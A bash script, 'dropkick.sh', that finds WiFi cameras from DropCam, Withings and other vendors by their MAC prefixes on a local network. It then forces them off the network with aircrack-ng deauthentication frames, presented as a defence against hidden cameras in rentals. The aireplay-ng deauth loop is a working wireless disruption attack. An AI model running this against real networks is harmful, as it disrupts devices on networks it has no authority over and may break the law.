#!/bin/bash
#
# DROPKICK.SH 
#
# Detect and Disconnect the DropCam and Withings devices some people are using to
# spy on guests in their home, especially in AirBnB rentals. Based on Glasshole.sh:
#
#   http://julianoliver.com/output/log_2014-05-30_20-52 
#
# This script was named by Adam Harvey (http://ahprojects.com), who also
# encouraged me to write it. It requires a GNU/Linux host (laptop, Raspberry Pi,
# etc) and the aircrack-ng suite. I put 'beep' in there for a little audio
# notification. Comment it out if you don't need it.
#
# See also http://plugunplug.net, for a plug-and-play device that does this
# based on OpenWrt. Code here:
#
#   https://github.com/JulianOliver/CyborgUnplug
# 
# Save as dropkick.sh, 'chmod +x dropkick.sh' and exec as follows:
#
#   sudo ./dropkick.sh <WIRELESS NIC> <BSSID OF ACCESS POINT>

shopt -s nocasematch # Set shell to ignore case
shopt -s extglob # For non-interactive shell.

readonly NIC=$1 # Your wireless NIC
readonly BSSID=$2 # Network BSSID (AirBnB WiFi network)
readonly MAC=$(/sbin/ifconfig | grep $NIC | head -n 1 | awk '{ print $5 }')
# MAC=$(ip link show "$NIC" | awk '/ether/ {print $2}') # If 'ifconfig' not
# present.
readonly GGMAC='@(30:8C:FB*|00:24:E4*|00:40:8C*|58:70:C6*|00:1F:54*|00:09:18*)' # Match against DropCam, Withings, Axis, Xiaomi, Lorex, and Samsung Techwin
readonly POLL=30 # Check every 30 seconds
readonly LOG=/var/log/dropkick.log

airmon-ng stop mon0 # Pull down any lingering monitor devices
airmon-ng start $NIC # Start a monitor device

while true;
    do  
        for TARGET in $(arp-scan -I $NIC --localnet | grep -o -E \
        '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}')
           do
               if [[ "$TARGET" == "$GGMAC" ]]
                   then
                       # Audio alert
                       beep -f 1000 -l 500 -n 200 -r 2
                       echo "WiFi camera discovered: "$TARGET >> $LOG
                       aireplay-ng -0 1 -a $BSSID -c $TARGET mon0 
                       echo "De-authed: "$TARGET " from network: " $BSSID >> $LOG
                       echo '
                             __              __    _     __          __                      
                         ___/ /______  ___  / /__ (_)___/ /_____ ___/ / 
                        / _  / __/ _ \/ _ \/   _// / __/   _/ -_) _  / 
                        \_,_/_/  \___/ .__/_/\_\/_/\__/_/\_\\__/\_,_/  
                                    /_/

                       '                                        
                    else
                        echo $TARGET": is not a DropCam or Withings device. Leaving alone.."
               fi
           done
           echo "None found this round."
           sleep $POLL
done
airmon-ng stop mon0
